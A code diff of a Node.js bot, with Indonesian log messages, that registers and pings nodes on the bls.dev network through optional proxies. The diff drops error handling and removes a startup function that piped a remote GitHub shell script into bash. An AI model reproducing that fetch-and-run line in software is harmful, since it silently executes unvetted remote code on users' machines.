@@ -4,11 +4,23 @@ const readline = require('readline');
 
 const apiBaseUrl = "https://gateway-run.bls.dev/api/v1";
 const ipServiceUrl = "https://tight-block-2413.txlabs.workers.dev";
+let config;
 let useProxy;
+
 const MAX_PING_ERRORS = 3;
 const pingInterval = 120000;
 const restartDelay = 240000;
 const processRestartDelay = 30000;
+
+async function loadConfig(filePath = 'config.json') {
+    try {
+        const data = await fs.readFile(filePath, 'utf-8');
+        return JSON.parse(data);
+    } catch (error) {
+        console.error(`[${new Date().toISOString()}] Gagal membaca konfigurasi: ${error.message}`);
+        process.exit(1);
+    }
+}
 
 async function loadFetch() {
     const fetch = await import('node-fetch').then(module => module.default);
@@ -53,15 +65,7 @@ async function registerNode(nodeId, hardwareId, ipAddress, agent, authToken) {
         agent
     });
 
-    let data;
-    try {
-        data = await response.json();
-    } catch (error) {
-        const text = await response.text();
-        console.error(`[${new Date().toISOString()}] Gagal parsing JSON. Respon teks:`, text);
-        throw new Error(`Respon JSON tidak valid: ${text}`);
-    }
-
+    const data = await response.json();
     console.log(`[${new Date().toISOString()}] Respon registrasi:`, data);
     return data;
 }
@@ -78,15 +82,7 @@ async function startSession(nodeId, agent, authToken) {
         agent
     });
 
-    let data;
-    try {
-        data = await response.json();
-    } catch (error) {
-        const text = await response.text();
-        console.error(`[${new Date().toISOString()}] Gagal parsing JSON. Respon teks:`, text);
-        throw new Error(`Respon JSON tidak valid: ${text}`);
-    }
-
+    const data = await response.json();
     console.log(`[${new Date().toISOString()}] Respon sesi mulai:`, data);
     return data;
 }
@@ -94,7 +90,6 @@ async function startSession(nodeId, agent, authToken) {
 async function pingNode(nodeId, agent, ipAddress, authToken, pingErrorCount) {
     const fetch = await loadFetch();
     const pingUrl = `${apiBaseUrl}/nodes/${nodeId}/ping`;
-
     const proxyInfo = agent ? JSON.stringify(agent.proxy) : 'Tidak ada proxy';
 
     console.log(`[${new Date().toISOString()}] Ping node ${nodeId} menggunakan proxy ${proxyInfo}`);
@@ -106,89 +101,30 @@ async function pingNode(nodeId, agent, ipAddress, authToken, pingErrorCount) {
         agent
     });
 
-    let data;
-    try {
-        data = await response.json();
-    } catch (error) {
-        const text = await response.text();
-        console.error(`[${new Date().toISOString()}] Gagal parsing JSON. Respon teks:`, text);
-        pingErrorCount[nodeId] = (pingErrorCount[nodeId] || 0) + 1;
-        throw new Error(`Respon JSON tidak valid: ${text}`);
-    }
-
-    if (!data.status) {
-        console.error(`[${new Date().toISOString()}] 'status' hilang dalam respon data:`, data);
-        pingErrorCount[nodeId] = (pingErrorCount[nodeId] || 0) + 1;
-        throw new Error(`'status' hilang dalam respon data: ${JSON.stringify(data)}`);
-    }
-
+    const data = await response.json();
     console.log(`[${new Date().toISOString()}] Status respon ping: ${data.status.toUpperCase()}, NodeID: ${nodeId}, Proxy: ${proxyInfo}, IP: ${ipAddress}`);
     pingErrorCount[nodeId] = 0;
     return data;
 }
 
-async function displayHeader() {
-    console.log("Mengunduh dan menjalankan skrip display...");
-    const { exec } = await import('child_process');
-    exec("curl -s https://raw.githubusercontent.com/Wawanahayy/JawaPride-all.sh/refs/heads/main/display.sh | bash");
-}
-
-const activeNodes = new Set();
-const nodeIntervals = new Map();
-
 async function processNode(node, agent, ipAddress, authToken) {
     const pingErrorCount = {};
-    let intervalId = null;
 
     while (true) {
         try {
-            if (activeNodes.has(node.nodeId)) {
-                console.log(`[${new Date().toISOString()}] Node ${node.nodeId} sedang diproses.`);
-                return;
-            }
-
-            activeNodes.add(node.nodeId);
             console.log(`[${new Date().toISOString()}] Memproses nodeId: ${node.nodeId}, hardwareId: ${node.hardwareId}, IP: ${ipAddress}`);
 
-            const registrationResponse = await registerNode(node.nodeId, node.hardwareId, ipAddress, agent, authToken);
-            console.log(`[${new Date().toISOString()}] Registrasi node selesai untuk nodeId: ${node.nodeId}. Respon:`, registrationResponse);
+            await registerNode(node.nodeId, node.hardwareId, ipAddress, agent, authToken);
+            await startSession(node.nodeId, agent, authToken);
 
-            const startSessionResponse = await startSession(node.nodeId, agent, authToken);
-            console.log(`[${new Date().toISOString()}] Sesi dimulai untuk nodeId: ${node.nodeId}. Respon:`, startSessionResponse);
-
-            console.log(`[${new Date().toISOString()}] Mengirim ping awal untuk nodeId: ${node.nodeId}`);
-            await pingNode(node.nodeId, agent, ipAddress, authToken, pingErrorCount);
-
-            if (!nodeIntervals.has(node.nodeId)) {
-                intervalId = setInterval(async () => {
-                    try {
-                        console.log(`[${new Date().toISOString()}] Mengirim ping untuk nodeId: ${node.nodeId}`);
-                        await pingNode(node.nodeId, agent, ipAddress, authToken, pingErrorCount);
-                    } catch (error) {
-                        console.error(`[${new Date().toISOString()}] Kesalahan saat ping: ${error.message}`);
-
-                        pingErrorCount[node.nodeId] = (pingErrorCount[node.nodeId] || 0) + 1;
-                        if (pingErrorCount[node.nodeId] >= MAX_PING_ERRORS) {
-                            clearInterval(nodeIntervals.get(node.nodeId));
-                            nodeIntervals.delete(node.nodeId);
-                            activeNodes.delete(node.nodeId);
-                            console.error(`[${new Date().toISOString()}] Ping gagal ${MAX_PING_ERRORS} kali berturut-turut untuk nodeId: ${node.nodeId}. Memulai ulang...`);
-                            await new Promise(resolve => setTimeout(resolve, processRestartDelay));
-                            await processNode(node, agent, ipAddress, authToken);
-                        }
-                        throw error;
-                    }
-                }, pingInterval);
-                nodeIntervals.set(node.nodeId, intervalId);
-            }
+            setInterval(async () => {
+                await pingNode(node.nodeId, agent, ipAddress, authToken, pingErrorCount);
+            }, pingInterval);
 
             break;
-
         } catch (error) {
             console.error(`[${new Date().toISOString()}] Terjadi kesalahan untuk nodeId: ${node.nodeId}, memulai ulang proses dalam 50 detik: ${error.message}`);
             await new Promise(resolve => setTimeout(resolve, restartDelay));
-        } finally {
-            activeNodes.delete(node.nodeId);
         }
     }
 }
@@ -196,11 +132,9 @@ async function processNode(node, agent, ipAddress, authToken) {
 async function runAll(initialRun = true) {
     try {
         if (initialRun) {
-            await displayHeader();
             useProxy = await promptUseProxy();
         }
 
-        // Perulangan untuk semua node dalam konfigurasi
         for (const user of config) {
             for (const node of user.nodes) {
                 const agent = useProxy ? new HttpsProxyAgent(node.proxy) : null;
@@ -214,9 +148,7 @@ async function runAll(initialRun = true) {
     }
 }
 
-process.on('uncaughtException', (error) => {
-    console.error(`[${new Date().toISOString()}] Exception tak tertangkap: ${error.message}`);
-    runAll(false);
-});
-
-runAll();
+(async () => {
+    config = await loadConfig();
+    await runAll();
+})();
